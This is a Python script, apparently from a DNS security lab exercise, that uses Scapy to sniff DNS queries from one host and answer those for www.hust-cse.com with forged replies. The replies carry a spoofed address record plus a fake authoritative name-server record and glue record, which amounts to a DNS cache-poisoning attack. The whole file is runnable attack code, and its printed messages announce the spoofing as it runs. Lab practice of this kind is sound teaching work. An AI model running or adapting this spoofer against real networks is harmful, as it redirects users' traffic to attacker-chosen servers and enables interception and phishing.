#!/usr/bin/env python3
from scapy.all import *
import time

def dns_spoof(pkt):
    # 检查是否是目标DNS查询
    if pkt.haslayer(DNSQR) and pkt[DNSQR].qname == b'www.hust-cse.com.':
        print(f"[+] 收到DNS查询: {pkt[IP].src} -> {pkt[IP].dst}")
        
        # 构造欺骗的DNS响应
        spoofed_ip = "20.21.9.1"
        auth_ns = "ns.hust-cse.com"
        auth_ns_ip = "20.24.4.9"
        
        # 构建DNS响应包
        dns_response = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=53) / \
                      DNS(
                          id=pkt[DNS].id,
                          qr=1,  # 响应
                          aa=1,  # 权威回答
                          qd=pkt[DNS].qd,
                          an=DNSRR(
                              rrname=pkt[DNSQR].qname,
                              type='A',
                              ttl=600,
                              rdata=spoofed_ip
                          ),
                          ns=DNSRR(
                              rrname="hust-cse.com.",
                              type='NS',
                              ttl=600,
                              rdata=auth_ns
                          ),
                          ar=DNSRR(
                              rrname=auth_ns + ".",
                              type='A',
                              ttl=600,
                              rdata=auth_ns_ip
                          )
                      )
        
        print(f"[+] 发送欺骗响应: A记录={spoofed_ip}, NS记录={auth_ns}, 附加记录={auth_ns_ip}")
        send(dns_response, verbose=0)
        return f"Spoofed DNS Response sent for {pkt[DNSQR].qname}"

# 启动DNS欺骗
print("[*] 启动DNS欺骗攻击...")
print("[*] 目标域名: www.hust-cse.com")
print("[*] 伪造A记录: 20.21.9.1")
print("[*] 伪造NS记录: ns.hust-cse.com")
print("[*] 伪造附加记录: 20.24.4.9")
print("[*] 监听DNS流量...")

# 监听DNS查询并响应
sniff(filter="udp port 53 and host 10.10.27.2", prn=dns_spoof, store=0)